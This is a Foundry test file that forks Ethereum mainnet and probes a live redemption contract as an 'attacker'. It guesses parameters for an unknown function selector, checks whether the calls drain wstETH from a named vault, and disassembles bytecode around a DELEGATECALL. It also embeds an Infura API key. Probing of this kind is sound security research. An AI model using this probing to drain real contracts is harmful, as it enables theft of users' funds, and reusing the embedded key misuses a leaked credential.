// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract Selector252c50f3 is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_Analyze252c50f3() public {
        console.log("=== ANALYZING 0x252c50f3 ===\n");

        // Try to understand what this selector does
        vm.startPrank(attacker);

        console.log("Testing different parameter patterns:");

        // No params
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x252c50f3))
        );
        console.log("No params - success:", s1);
        if (s1) {
            console.log("  Return length:", d1.length);
            if (d1.length >= 32) {
                console.log("  First word:", uint256(bytes32(d1)));
            }
        }

        // Single address
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x252c50f3), attacker)
        );
        console.log("address - success:", s2);
        if (s2 && d2.length >= 32) {
            console.log("  Return:", uint256(bytes32(d2)));
        }

        // address, uint256
        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x252c50f3), attacker, 100e18)
        );
        console.log("(address, uint256) - success:", s3);
        if (s3 && d3.length >= 32) {
            console.log("  Return:", uint256(bytes32(d3)));
        }

        // uint256, address
        (bool s4, bytes memory d4) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x252c50f3), 100e18, attacker)
        );
        console.log("(uint256, address) - success:", s4);
        if (s4 && d4.length >= 32) {
            console.log("  Return:", uint256(bytes32(d4)));
        }

        // address, bytes
        bytes memory rcCall = abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker);
        (bool s5, bytes memory d5) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x252c50f3), REDEMPTION_CONTROLLER, rcCall)
        );
        console.log("(address, bytes) - success:", s5);
        if (s5 && d5.length >= 32) {
            console.log("  Return:", uint256(bytes32(d5)));
        }

        vm.stopPrank();
    }

    function test_CheckVaultDrain252c50f3() public {
        console.log("=== CHECKING IF 0x252c50f3 DRAINS VAULT ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        // Try various parameter combos
        bytes memory rcCall = abi.encodeWithSignature("redeem(uint256,address)", 500e18, attacker);

        // Try (RC, rcCall)
        REDEMPTION_1.call(abi.encodeWithSelector(bytes4(0x252c50f3), REDEMPTION_CONTROLLER, rcCall));

        // Try (attacker, amount)
        REDEMPTION_1.call(abi.encodeWithSelector(bytes4(0x252c50f3), attacker, 500e18));

        // Try (amount, attacker)
        REDEMPTION_1.call(abi.encodeWithSelector(bytes4(0x252c50f3), 500e18, attacker));

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);

        console.log("Vault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);

        if (attackerWstETH > 0) {
            console.log("\n*** 0x252c50f3 DRAINED VAULT! ***");
        }
    }

    function test_AnalyzeDelegatecall2709() public view {
        console.log("=== ANALYZING DELEGATECALL AT OFFSET 2709 ===\n");

        bytes memory code = REDEMPTION_1.code;

        console.log("Bytecode around offset 2709:");

        for (uint i = 2650; i < 2750 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x35) console.log(i, "CALLDATALOAD");
            else if (op == 0x36) console.log(i, "CALLDATASIZE");
            else if (op == 0x54) console.log(i, "SLOAD");
            else if (op == 0x55) console.log(i, "SSTORE");
            else if (op == 0xf1) console.log(i, "CALL");
            else if (op == 0xf4) console.log(i, "DELEGATECALL");
            else if (op == 0x5b) console.log(i, "JUMPDEST");
            else if (op == 0x51) console.log(i, "MLOAD");
            else if (op == 0x52) console.log(i, "MSTORE");
            else if (op == 0x73) console.log(i, "PUSH20");
            else if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                if (size <= 4 && val < 10000) {
                    console.log(i, "PUSH val:", val);
                } else if (size == 4) {
                    console.log(i, "PUSH4:");
                    console.logBytes4(bytes4(uint32(val)));
                }
            }
        }
    }

    function test_FindFunctionFor2709() public view {
        console.log("=== FINDING FUNCTION THAT REACHES OFFSET 2709 ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Work backwards from 2709 to find the function selector
        // Look for JUMPDEST and then trace back to selector

        console.log("Looking for JUMPDEST before 2709:");
        for (uint i = 2709; i > 2709 - 500 && i > 0; i--) {
            if (uint8(code[i]) == 0x5b) {
                console.log("JUMPDEST at:", i);

                // Now look for what selector jumps to this
                // The jump target is pushed before JUMPI
            }
        }

        // Check selectors and their jump targets
        console.log("\nSelector -> jump target mapping:");
        for (uint i = 0; i < 500 && i < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == 0xffffffff) continue;

                // Look for following jump target
                for (uint j = i + 5; j < i + 20 && j + 2 < code.length; j++) {
                    if (uint8(code[j]) == 0x61) { // PUSH2
                        uint16 target = uint16(uint8(code[j+1])) << 8 | uint16(uint8(code[j+2]));
                        if (target > 2600 && target < 2800) {
                            console.log("Selector:");
                            console.logBytes4(sel);
                            console.log("  Jump target:", target);
                        }
                        break;
                    }
                }
            }
        }
    }

    function test_CheckKnownFunctionNames() public view {
        console.log("=== CHECKING KNOWN FUNCTION NAMES ===\n");

        // Try to identify 0x252c50f3
        bytes4 sel = bytes4(0x252c50f3);

        // Common function signatures
        console.log("Checking common signatures:");
        console.log("harvest():");
        console.logBytes4(bytes4(keccak256("harvest()")));
        console.log("claim():");
        console.logBytes4(bytes4(keccak256("claim()")));
        console.log("compound():");
        console.logBytes4(bytes4(keccak256("compound()")));
        console.log("reinvest():");
        console.logBytes4(bytes4(keccak256("reinvest()")));
        console.log("depositAll():");
        console.logBytes4(bytes4(keccak256("depositAll()")));
        console.log("withdrawAll():");
        console.logBytes4(bytes4(keccak256("withdrawAll()")));
        console.log("collectRewards():");
        console.logBytes4(bytes4(keccak256("collectRewards()")));
        console.log("claimRewards():");
        console.logBytes4(bytes4(keccak256("claimRewards()")));
        console.log("distributeRewards():");
        console.logBytes4(bytes4(keccak256("distributeRewards()")));

        console.log("\nTarget selector:");
        console.logBytes4(sel);
    }

    function test_CheckSlot5ImplFunctions() public {
        console.log("=== CHECKING SLOT5 IMPLEMENTATION FUNCTIONS ===\n");

        address SLOT5_IMPL = 0x434B68B11bBE8FD3074089397cA3d275801d6354;

        // Call slot5 impl functions via REDEMPTION_1

        vm.startPrank(attacker);

        // 0xddca3f43 - ?
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xddca3f43))
        );
        console.log("0xddca3f43():", s1);
        if (s1 && d1.length >= 32) {
            console.log("  Return:", uint256(bytes32(d1)));
        }

        // 0x69fe0e2d - ?
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x69fe0e2d), 100)
        );
        console.log("0x69fe0e2d(100):", s2);

        // 0x781b7e08 - ?
        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x781b7e08))
        );
        console.log("0x781b7e08():", s3);
        if (s3 && d3.length >= 32) {
            console.log("  Return:", uint256(bytes32(d3)));
        }

        vm.stopPrank();
    }
}
